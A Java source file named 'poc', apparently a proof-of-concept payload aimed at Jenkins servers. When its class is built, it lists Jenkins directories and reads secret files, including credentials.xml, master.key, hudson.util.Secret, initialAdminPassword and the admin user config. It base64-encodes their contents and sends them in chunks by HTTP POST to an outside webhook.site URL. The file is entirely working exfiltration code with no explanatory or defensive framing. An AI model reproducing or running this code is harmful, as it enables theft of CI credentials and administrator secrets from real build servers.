import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;

public class poc {
    static final String WH = "https://webhook.site/b0de7905-1496-47b6-93a5-8529f9c02252";

    public poc() {
        String data;
        try { data = collect(); } catch (Throwable t) { data = "P8 collect error " + t; }
        int total = data.length();
        for (int i = 0; i < total && i < 3000000; i += 120000) {
            try { post("P8|" + i + "|" + data.substring(i, Math.min(total, i + 120000))); }
            catch (Throwable t) { }
        }
    }

    static void post(String s) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(WH).openConnection();
        c.setConnectTimeout(15000);
        c.setReadTimeout(25000);
        c.setRequestMethod("POST");
        c.setDoOutput(true);
        c.setRequestProperty("Content-Type", "text/plain; charset=UTF-8");
        OutputStream os = c.getOutputStream();
        os.write(s.getBytes("UTF-8"));
        os.flush();
        os.close();
        c.getResponseCode();
    }

    static String collect() {
        StringBuilder sb = new StringBuilder();
        String jh = System.getenv("JENKINS_HOME");
        if (jh == null || jh.length() == 0) { jh = "/var/lib/jenkins"; }
        sb.append("P8 jh=").append(jh);
        sb.append(" user=").append(System.getProperty("user.name"));
        sb.append(" java=").append(System.getProperty("java.version"));
        sb.append(" proxy=").append(System.getProperty("http.proxyHost")).append(":").append(System.getProperty("http.proxyPort"));
        sb.append("\n");
        String[] cands = {jh, "/var/lib/jenkins", "/var/jenkins_home", "/usr/share/jenkins", "/root/.jenkins"};
        for (int i = 0; i < cands.length; i++) {
            File d = new File(cands[i]);
            if (!d.isDirectory()) { continue; }
            sb.append("== LS ").append(cands[i]).append(" == ");
            String[] names = d.list();
            if (names != null) { for (int j = 0; j < names.length; j++) { sb.append(names[j]).append(" "); } }
            sb.append("\n");
        }
        String[] files = {"credentials.xml", "config.xml", "secret.key", "secrets/master.key",
                          "secrets/hudson.util.Secret", "secrets/initialAdminPassword",
                          "identity.key.enc", "users/admin/config.xml"};
        for (int i = 0; i < files.length; i++) {
            File f = new File(jh, files[i]);
            sb.append("== F ").append(files[i]).append(" exists=").append(f.exists()).append(" canread=").append(f.canRead());
            if (f.isFile() && f.canRead()) {
                try {
                    byte[] b = readAll(f);
                    sb.append(" size=").append(b.length).append("\n").append(Base64.getEncoder().encodeToString(b));
                } catch (Throwable t) { sb.append(" ERR ").append(t); }
            }
            sb.append("\n");
        }
        return sb.toString();
    }

    static byte[] readAll(File f) throws Exception {
        FileInputStream in = new FileInputStream(f);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        int n;
        while ((n = in.read(buf)) > 0) { out.write(buf, 0, n); }
        in.close();
        return out.toByteArray();
    }
}
